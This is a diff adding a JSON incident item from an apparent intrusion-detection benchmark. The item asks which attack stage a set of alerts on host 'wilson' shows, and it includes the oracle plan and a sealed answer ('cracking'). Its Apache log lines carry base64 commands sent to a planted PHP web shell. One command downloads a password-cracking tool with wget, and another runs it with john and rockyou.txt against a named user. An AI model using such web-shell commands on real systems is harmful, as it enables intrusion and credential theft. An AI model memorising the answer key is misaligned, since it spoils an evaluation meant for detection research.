@@ -1,0 +1,195 @@
+{
+  "incident_id": "ait-wilson-cracking",
+  "name": "AIT-ADS wilson/cracking",
+  "source_benchmark": "Cyber-AIT-ADS",
+  "source_scenario": "wilson/cracking",
+  "alert": {
+    "timestamp": "2022-02-07T11:20:39Z",
+    "host": "wilson",
+    "user": "unknown",
+    "alert_type": "ait_ads_stage",
+    "summary": "AIT-ADS multi-step stage candidate on wilson. Identify the attack stage from telemetry."
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "alerts"
+    ],
+    "start": "2022-02-07T11:20:39Z",
+    "end": "2022-02-07T11:29:49Z",
+    "hosts": [
+      "wilson"
+    ]
+  },
+  "telemetry": {
+    "alerts": [
+      {
+        "event_id": "ait-0001-047993a7",
+        "timestamp": "2022-02-07T11:20:39Z",
+        "host": "wilson",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.182.193.78 - - [07/Feb/2022:11:20:39 +0000] \"GET /wp-content/uploads/2022/02/zpinqklqgo-1644232829.6164.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506731 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1644232839.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.182.193.78 - - [07/Feb/2022:11:20:39 +0000] \"GET /wp-content/uploads/2022/02/zpinqklqgo-1644232829.6164.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506731 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0002-74b196a6",
+        "timestamp": "2022-02-07T11:21:03Z",
+        "host": "wilson",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.182.193.78 - - [07/Feb/2022:11:21:03 +0000] \"GET /wp-content/uploads/2022/02/zpinqklqgo-1644232829.6164.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAiandpbGtpbnNvbiJd HTTP/1.1\" 200 506890 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1644232863.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.182.193.78 - - [07/Feb/2022:11:21:03 +0000] \"GET /wp-content/uploads/2022/02/zpinqklqgo-1644232829.6164.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAiandpbGtpbnNvbiJd HTTP/1.1\" 200 506890 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0003-f7ef7fad",
+        "timestamp": "2022-02-07T11:29:49Z",
+        "host": "wilson",
+        "detector": "AMiner: CPU value deviates from average in monitoring logs.",
+        "message": "{\"@timestamp\":\"2022-02-07T11:29:49.086Z\",\"host\":{\"name\":\"intranet-server\",\"cpu\":{\"pct\":1}},\"event\":{\"dataset\":\"system.cpu\",\"module\":\"system\",\"duration\":1353680},\"agent\":{\"id\":\"da99bcc3-c6bc-4a35-b6b1-b0240157675f\",\"type\":\"metricbeat\",\"version\":\"7.13.2\",\"ephemeral_id\":\"9aa22b27-798d-490c-9789-25bfb578d74b\",\"name\":\"intranet-server\",\"hostname\":\"intranet-server\"},\"metricset\":{\"name\":\"cpu\",\"period\":45000},\"@version\":\"1\",\"tags\":[\"beats_input_raw_event\"],\"service\":{\"type\":\"system\"},\"system\":{\"cpu\":{\"steal\":{\"norm\":{\"pct\":2.0E-4},\"pct\":2.0E-4},\"iowait\":{\"norm\":{\"pct\":0},\"pct\":0},\"cores\":1,\"idle\":{\"norm\":{\"pct\":0},\"pct\":0},\"softirq\":{\"norm\":{\"pct\":0.0029},\"pct\":0.0029},\"total\":{\"norm\":{\"pct\":1},\"pct\":1},\"user\":{\"norm\":{\"pct\":0.0136},\"pct\":0.0136},\"irq\":{\"norm\":{\"pct\":0},\"pct\":0},\"system\":{\"norm\":{\"pct\":0.0222},\"pct\":0.0222},\"nice\":{\"norm\":{\"pct\":0.9611},\"pct\":0.9611}}},\"ecs\":{\"version\":\"1.9.0\"}}",
+        "raw_alert": {
+          "timestamp": 1644233389.09,
+          "detector": "AMiner: CPU value deviates from average in monitoring logs.",
+          "message": "{\"@timestamp\":\"2022-02-07T11:29:49.086Z\",\"host\":{\"name\":\"intranet-server\",\"cpu\":{\"pct\":1}},\"event\":{\"dataset\":\"system.cpu\",\"module\":\"system\",\"duration\":1353680},\"agent\":{\"id\":\"da99bcc3-c6bc-4a35-b6b1-b0240157675f\",\"type\":\"metricbeat\",\"version\":\"7.13.2\",\"ephemeral_id\":\"9aa22b27-798d-490c-9789-25bfb578d74b\",\"name\":\"intranet-server\",\"hostname\":\"intranet-server\"},\"metricset\":{\"name\":\"cpu\",\"period\":45000},\"@version\":\"1\",\"tags\":[\"beats_input_raw_event\"],\"service\":{\"type\":\"system\"},\"system\":{\"cpu\":{\"steal\":{\"norm\":{\"pct\":2.0E-4},\"pct\":2.0E-4},\"iowait\":{\"norm\":{\"pct\":0},\"pct\":0},\"cores\":1,\"idle\":{\"norm\":{\"pct\":0},\"pct\":0},\"softirq\":{\"norm\":{\"pct\":0.0029},\"pct\":0.0029},\"total\":{\"norm\":{\"pct\":1},\"pct\":1},\"user\":{\"norm\":{\"pct\":0.0136},\"pct\":0.0136},\"irq\":{\"norm\":{\"pct\":0},\"pct\":0},\"system\":{\"norm\":{\"pct\":0.0222},\"pct\":0.0222},\"nice\":{\"norm\":{\"pct\":0.9611},\"pct\":0.9611}}},\"ecs\":{\"version\":\"1.9.0\"}}"
+        }
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "ait-0001-047993a7",
+      "source": "alerts",
+      "timestamp": "2022-02-07T11:20:39Z",
+      "host": "wilson",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.182.193.78 - - [07/Feb/2022:11:20:39 +0000] \"GET /wp-content/uploads/2022/02/zpinqklqgo-1644232829.6164.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506731 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1644232839.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.182.193.78 - - [07/Feb/2022:11:20:39 +0000] \"GET /wp-content/uploads/2022/02/zpinqklqgo-1644232829.6164.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506731 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0002-74b196a6",
+      "source": "alerts",
+      "timestamp": "2022-02-07T11:21:03Z",
+      "host": "wilson",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.182.193.78 - - [07/Feb/2022:11:21:03 +0000] \"GET /wp-content/uploads/2022/02/zpinqklqgo-1644232829.6164.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAiandpbGtpbnNvbiJd HTTP/1.1\" 200 506890 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1644232863.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.182.193.78 - - [07/Feb/2022:11:21:03 +0000] \"GET /wp-content/uploads/2022/02/zpinqklqgo-1644232829.6164.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAiandpbGtpbnNvbiJd HTTP/1.1\" 200 506890 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0003-f7ef7fad",
+      "source": "alerts",
+      "timestamp": "2022-02-07T11:29:49Z",
+      "host": "wilson",
+      "fields": {
+        "detector": "AMiner: CPU value deviates from average in monitoring logs.",
+        "message": "{\"@timestamp\":\"2022-02-07T11:29:49.086Z\",\"host\":{\"name\":\"intranet-server\",\"cpu\":{\"pct\":1}},\"event\":{\"dataset\":\"system.cpu\",\"module\":\"system\",\"duration\":1353680},\"agent\":{\"id\":\"da99bcc3-c6bc-4a35-b6b1-b0240157675f\",\"type\":\"metricbeat\",\"version\":\"7.13.2\",\"ephemeral_id\":\"9aa22b27-798d-490c-9789-25bfb578d74b\",\"name\":\"intranet-server\",\"hostname\":\"intranet-server\"},\"metricset\":{\"name\":\"cpu\",\"period\":45000},\"@version\":\"1\",\"tags\":[\"beats_input_raw_event\"],\"service\":{\"type\":\"system\"},\"system\":{\"cpu\":{\"steal\":{\"norm\":{\"pct\":2.0E-4},\"pct\":2.0E-4},\"iowait\":{\"norm\":{\"pct\":0},\"pct\":0},\"cores\":1,\"idle\":{\"norm\":{\"pct\":0},\"pct\":0},\"softirq\":{\"norm\":{\"pct\":0.0029},\"pct\":0.0029},\"total\":{\"norm\":{\"pct\":1},\"pct\":1},\"user\":{\"norm\":{\"pct\":0.0136},\"pct\":0.0136},\"irq\":{\"norm\":{\"pct\":0},\"pct\":0},\"system\":{\"norm\":{\"pct\":0.0222},\"pct\":0.0222},\"nice\":{\"norm\":{\"pct\":0.9611},\"pct\":0.9611}}},\"ecs\":{\"version\":\"1.9.0\"}}",
+        "raw_alert": {
+          "timestamp": 1644233389.09,
+          "detector": "AMiner: CPU value deviates from average in monitoring logs.",
+          "message": "{\"@timestamp\":\"2022-02-07T11:29:49.086Z\",\"host\":{\"name\":\"intranet-server\",\"cpu\":{\"pct\":1}},\"event\":{\"dataset\":\"system.cpu\",\"module\":\"system\",\"duration\":1353680},\"agent\":{\"id\":\"da99bcc3-c6bc-4a35-b6b1-b0240157675f\",\"type\":\"metricbeat\",\"version\":\"7.13.2\",\"ephemeral_id\":\"9aa22b27-798d-490c-9789-25bfb578d74b\",\"name\":\"intranet-server\",\"hostname\":\"intranet-server\"},\"metricset\":{\"name\":\"cpu\",\"period\":45000},\"@version\":\"1\",\"tags\":[\"beats_input_raw_event\"],\"service\":{\"type\":\"system\"},\"system\":{\"cpu\":{\"steal\":{\"norm\":{\"pct\":2.0E-4},\"pct\":2.0E-4},\"iowait\":{\"norm\":{\"pct\":0},\"pct\":0},\"cores\":1,\"idle\":{\"norm\":{\"pct\":0},\"pct\":0},\"softirq\":{\"norm\":{\"pct\":0.0029},\"pct\":0.0029},\"total\":{\"norm\":{\"pct\":1},\"pct\":1},\"user\":{\"norm\":{\"pct\":0.0136},\"pct\":0.0136},\"irq\":{\"norm\":{\"pct\":0},\"pct\":0},\"system\":{\"norm\":{\"pct\":0.0222},\"pct\":0.0222},\"nice\":{\"norm\":{\"pct\":0.9611},\"pct\":0.9611}}},\"ecs\":{\"version\":\"1.9.0\"}}"
+        }
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "wilson"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "wilson"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "AIT-ADS multi-step stage candidate on wilson. Identify the attack stage from telemetry.",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "wilson"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "wilson"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "AIT-ADS multi-step stage candidate on wilson. Identify the attack stage from telemetry.",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "Cyber-AIT-ADS",
+    "scenario": "wilson/cracking",
+    "answer": "cracking",
+    "accept": [
+      "cracking",
+      "cracking"
+    ],
+    "grading": "exact_ci",
+    "sealed": true
+  }
+}
